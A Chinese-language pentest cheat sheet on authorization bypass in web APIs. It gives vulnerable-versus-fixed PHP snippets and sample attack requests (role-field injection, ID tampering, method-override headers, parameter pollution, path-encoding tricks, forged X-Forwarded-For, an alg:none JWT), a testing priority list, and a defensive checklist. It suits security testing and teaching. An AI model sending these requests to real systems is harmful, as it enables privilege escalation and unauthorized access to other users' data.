# 功能级别授权绕过秘笈

## 功能级别授权原理

### 缺少功能级别检查
```php
// 漏洞：仅检查是否已认证，未检查权限
if (auth_check()) {
    delete_user($userId);  // 任何已认证用户都可删除任何用户
}

// 正确做法：
if (auth_check() && has_permission('delete_users')) {
    delete_user($userId);
}
```

### 权限检查不完整
```php
// 漏洞：仅检查部分操作
if (auth_check()) {
    if ($action == 'view_profile') {
        // 权限检查
    }
    // 但delete, edit, create等操作无检查
}
```

## API端点暴露

### 未受保护的管理API
```
GET /api/admin/users           # 列表所有用户
POST /api/admin/users          # 创建用户
DELETE /api/admin/users/{id}   # 删除用户
PUT /api/admin/settings        # 修改系统设置

普通用户可直接调用这些API
```

### 后台端点直接访问
```
/admin/dashboard              # 管理仪表板
/admin/reports                # 生成报告
/admin/audit_logs             # 查看审计日志
/admin/backup                 # 创建备份
/api/admin/*                  # 所有管理API

缺少身份验证或授权检查
```

## 角色和权限混淆

### 角色提升
```
普通用户请求体包含role字段：

POST /api/profile HTTP/1.1
{
    "name": "John",
    "email": "john@test.com",
    "role": "admin"
}

# 应用直接使用role字段，导致权限提升
```

### 权限检查顺序错误
```php
// 错误的实现
if ($user->role == 'admin') {
    perform_admin_action();
}
// 如果role可被修改，检查失败

// 应该从数据库重新获取：
$user = User::find($userId);  // 从DB获取最新role
if ($user->role == 'admin') {
    perform_admin_action();
}
```

## 用户ID和所有权检查

### 跨用户资源访问
```
GET /api/user/123/documents
GET /api/user/456/documents  # 修改ID访问其他用户的文件

缺少所有权检查：
$documents = Document::where('user_id', $requested_id)->get();
# 应该检查当前用户是否是owner
```

### 所有权验证不当
```php
// 漏洞
$post = Post::find($postId);
$post->update(request()->all());  // 未检查当前用户是否是作者

// 正确
$post = Post::where('id', $postId)
    ->where('author_id', auth()->id())
    ->firstOrFail();
$post->update(request()->all());
```

## 批量操作授权绕过

### 批量删除无权限检查
```
POST /api/delete_multiple

请求体：
{
    "ids": [1, 2, 3, 999]
}

# 应用删除所有ID，包括不属于当前用户的记录
```

### 批量更新权限提升
```
POST /api/users/bulk_update

{
    "ids": [1, 2, 3],
    "role": "admin"
}

# 应用将id为1, 2, 3的用户角色改为admin
```

## 功能隐藏与直接访问

### 隐藏的管理功能
```
应用隐藏了某些管理功能（前端不显示）
但端点仍然可访问

GET /admin/export_database  # 前端未显示，但可直接访问
POST /admin/mass_email      # 隐藏功能
GET /admin/user_logs        # 审计信息暴露
```

### 版本化API绕过
```
应用升级后禁用了/api/v1/admin/
但/api/v2/admin/可能也暴露

或存在多个版本的同一端点
/api/admin/delete (v1, 已移除)
/admin/delete (v2, 新地址)
```

## 团队和组织级别权限

### 组织切换
```
GET /api/organization/123/settings
GET /api/organization/456/settings  # 修改ID访问其他组织

缺少检查当前用户是否属于该组织
```

### 团队成员权限注入
```
POST /api/team/123/members/add

{
    "user_id": 456,
    "role": "admin"
}

# 应该检查当前用户是否是团队管理员
```

## 高级授权绕过

### HTTP方法覆盖
```
# 某些框架支持方法覆盖
POST /api/user/123/profile HTTP/1.1
X-HTTP-Method-Override: DELETE
Content-Length: 0

# 应用可能认为这是DELETE请求，绕过仅对GET/POST的权限检查

# 其他头部：
X-Method-Override: DELETE
X-HTTP-Method: DELETE
_method=DELETE (POST参数)
```

### 参数污染（HPP）
```
# 同一参数多次提交
GET /api/admin/settings?userId=123&userId=456

# 不同部分处理不同userId导致权限检查和执行分离
检查：userId=123（当前用户，通过）
执行：userId=456（目标用户，被修改）

# POST参数污染
POST /api/update
name=admin&role=user&role=admin

# 某些框架采用最后一个值，授权检查使用第一个值
```

### 会话和Token操作
```
# 1. 会话固定
攻击者访问：/login?sessionId=attacker_session
用户登录到该sessionId
攻击者使用该sessionId冒充用户

# 2. Token重用
访问多个资源使用同一个token
某些API可能不刷新token，导致过期检查失败

# 3. Token预测
如果token是可预测的（时间戳、用户ID等）
攻击者可预测其他用户的token

# 4. Cookie/Session污染
Set-Cookie: admin=0
Set-Cookie: admin=1  # 某些框架采用最后一个值

# 检查使用第一个，执行使用第二个
```

### 路径遍历和符号链接绕过
```
# 路径规范化不完整
GET /api/admin/../user/profile  # 规范化为/api/user/profile

# 大小写敏感性
GET /api/Admin/settings  # /api/admin/被检查，但/api/Admin/不检查

# URL编码混淆
GET /api/%61dmin/settings  # %61 = 'a'，规范化失败
GET /api/admin%00/settings  # 空字节截断（某些框架）

# 双编码
GET /api/%252561dmin/settings  # 双重解码
```

### 角色和权限缓存漏洞
```php
// 漏洞：权限缓存未刷新
session_start();
if (!isset($_SESSION['permissions'])) {
    $_SESSION['permissions'] = get_user_permissions();  // 仅首次获取
}

// 攻击：修改数据库中的权限，但缓存仍然有效
// 解决：每次请求重新验证或设置缓存超时
```

### 条件竞争导致的权限检查绕过
```
# 1. 检查-使用窗口
并发请求1：检查权限（通过）
并发请求2：修改权限（降权）
并发请求1：执行（权限已变，但已通过检查）

# 2. 删除和访问竞争
请求1：检查资源所有权（通过）
请求2：删除资源
请求1：执行删除/修改（资源已被删除）

# 防御：原子操作或锁机制
```

### HTTP头部认证绕过

#### 1. 代理头部伪造
```
# 应用依赖代理头部进行身份验证或权限检查
GET /api/admin/users HTTP/1.1
X-Forwarded-For: 127.0.0.1          # 伪造源IP为本地地址
Authorization: Bearer invalid_token

# 或结合真实token绕过IP限制
GET /api/admin/settings HTTP/1.1
X-Forwarded-For: 10.0.0.1           # 声称来自内部网络
X-Real-IP: 192.168.1.1
X-Forwarded-Proto: https

# 常见代理头部
X-Forwarded-For              # 原始客户端IP
X-Real-IP                    # 真实IP
X-Original-URL               # 原始URL
X-Rewrite-URL                # 重写URL
X-Forwarded-Proto            # 协议(http/https)
X-Forwarded-Host             # 原始主机名
CF-Connecting-IP             # Cloudflare客户端IP
True-Client-IP               # Akamai真实IP
```

#### 2. Authorization头部操作
```
# 2.1 删除Authorization头部绕过认证检查
GET /api/admin/users HTTP/1.1
# 移除Authorization头部，某些框架可能默认允许

# 2.2 多个Authorization头部（选择性使用）
GET /api/admin/settings HTTP/1.1
Authorization: Bearer user_token
Authorization: Bearer admin_token
# 不同框架可能采用不同的值（第一个、最后一个或合并）

# 2.3 空Authorization头部或仅保留Bearer
GET /api/admin/users HTTP/1.1
Authorization: Bearer
# 某些验证逻辑可能错误地认为头部存在即已认证

# 2.4 Authorization头部大小写变化
GET /api/admin/users HTTP/1.1
authorization: Bearer valid_token  # 小写
AUTHORIZATION: Bearer valid_token  # 大写
Authorization: Bearer valid_token  # 标准格式
# 头部检查可能区分大小写

# 2.5 添加额外参数到Authorization值
GET /api/admin/users HTTP/1.1
Authorization: Bearer valid_token; admin=true
Authorization: Bearer valid_token?role=admin
# 某些框架可能忽略分号或问号后的内容
```

#### 3. CORS预检绕过认证
```
# CORS预检请求可能跳过认证检查
OPTIONS /api/admin/users HTTP/1.1
Origin: https://attacker.com
Access-Control-Request-Method: DELETE

# 框架可能无条件允许OPTIONS请求，而实际DELETE请求需要认证
# 攻击者可利用浏览器CORS预检机制绕过认证

# 非标准METHOD可能跳过检查
TRACE /api/admin/settings HTTP/1.1
CONNECT /api/admin/users HTTP/1.1
PATCH /api/admin/settings HTTP/1.1
```

#### 4. JWT头部攻击
```
# 4.1 JWT算法混淆（alg: none）
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.

# Header部分解码后：
{"alg": "none", "typ": "JWT"}

# 某些JWT库如果alg为none可能跳过签名验证

# 4.2 JWT签名密钥信息泄露
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# 如果secret使用弱密钥或默认值，可被爆破

# 4.3 JWT payload中的权限字段修改
# 如果校验不严格，payload中的角色字段可能被篡改
{"sub": "user123", "role": "admin", "iat": 1516239022}

# 4.4 JWT过期时间绕过
{"sub": "user123", "role": "user", "exp": 9999999999}
# exp字段为远期日期或缺失，导致过期检查失败
```

#### 5. 自定义头部注入
```
# 5.1 应用自定义认证头部
GET /api/admin/users HTTP/1.1
X-User-ID: 1
X-User-Role: admin
# 直接在自定义头部指定用户身份和权限

# 5.2 特殊用途头部混淆
GET /api/admin/settings HTTP/1.1
X-Admin-Token: secret_admin_key
X-Bypass-Auth: true
X-Force-Admin: 1

# 5.3 头部值格式变化
GET /api/admin/users HTTP/1.1
X-Authorization: Bearer token123
x-authorization: Bearer token123      # 小写
X-AUTHORIZATION: Bearer token123      # 大写

# 5.4 头部值空格或编码
GET /api/admin/users HTTP/1.1
Authorization:Bearer token123         # 缺少空格
Authorization: Bearer  token123        # 多余空格
Authorization: Bearer%20token123       # URL编码
```

#### 6. 头部污染和边界情况
```
# 6.1 注入额外头部绕过检查
GET /api/admin/users HTTP/1.1
Authorization: Bearer user_token
X-Override-User: admin

# 6.2 头部名称URL编码
GET /api/admin/users HTTP/1.1
%41uthorization: Bearer token123      # %41 = 'A'

# 6.3 头部值中包含换行符(HTTP Response Splitting相关)
GET /api/admin/users HTTP/1.1
Authorization: Bearer token%0D%0AX-Forwarded-For: 127.0.0.1

# 6.4 Content-Type头部欺骗
POST /api/admin/users HTTP/1.1
Content-Type: text/plain
Authorization: Bearer user_token
# 服务器可能基于Content-Type跳过认证检查
```

## 快速定位和利用

**关键词识别**：
- 缺少权限检查的API端点
- 用户输入直接用于权限决策
- 缺少所有权验证
- 前端隐藏但后端可访问的功能
- 批量操作无逐项检查

**常见端点模式**：
```
/api/admin/*
/api/user/{id}/*
/api/organization/{id}/*
/api/team/{id}/settings
/api/**/delete
/api/**/export
/api/**/backup
```

**高级绕过关键词**：
- X-HTTP-Method-Override、X-Method-Override头部
- 多个相同参数名（参数污染）
- 会话固定、Token预测、Cookie污染
- 路径规范化（..、%00、URL编码）
- 权限缓存、过期检查不当
- API版本差异、格式差异
- HTTP头部认证绕过（代理头部、Authorization操作、CORS预检、JWT攻击、自定义头部）

**测试优先级**：
1. 基础绕过：尝试访问隐藏的管理API
2. ID枚举：修改用户ID访问其他用户资源
3. 角色提升：在请求中添加role/permission字段
4. 批量操作：尝试跨界限资源的批量修改/删除
5. HTTP方法：使用X-HTTP-Method-Override覆盖请求方法
6. 参数污染：同一参数多次提交，触发解析差异
7. 路径混淆：使用..、%00、大小写等规范化绕过
8. 会话操作：会话固定、Token预测、权限缓存
9. API版本：测试多个API版本和格式的权限差异
10. HTTP头部认证绕过：代理头部伪造、Authorization操作、CORS预检、JWT攻击、自定义头部注入
11. 条件竞争：并发请求导致的权限检查绕过

## 防御检查清单

- ✓ 每个API端点检查认证和授权
- ✓ 验证用户是否拥有/有权访问该资源
- ✓ 从数据库获取用户权限，不信任客户端
- ✓ 角色和权限决策在服务器端
- ✓ 批量操作：逐项检查权限
- ✓ 使用访问控制列表(ACL)
- ✓ 日志记录所有权限检查
- ✓ 定期审计功能级别访问
- ✓ 测试所有用户角色的端点访问
- ✓ HTTP头部认证防御：
  - ✓ 仅信任白名单的代理头部（X-Forwarded-For等）
  - ✓ 严格验证Authorization头部格式和签名
  - ✓ 要求所有API端点都经过认证（OPTIONS请求除外需特殊处理）
  - ✓ JWT验证：检查签名、过期时间、算法，拒绝alg:none
  - ✓ 避免使用自定义认证头部，使用标准Authorization头部
  - ✓ 头部值解析：避免歧义，规范化处理格式变化
  - ✓ 不基于单一头部做权限决策，多因素验证
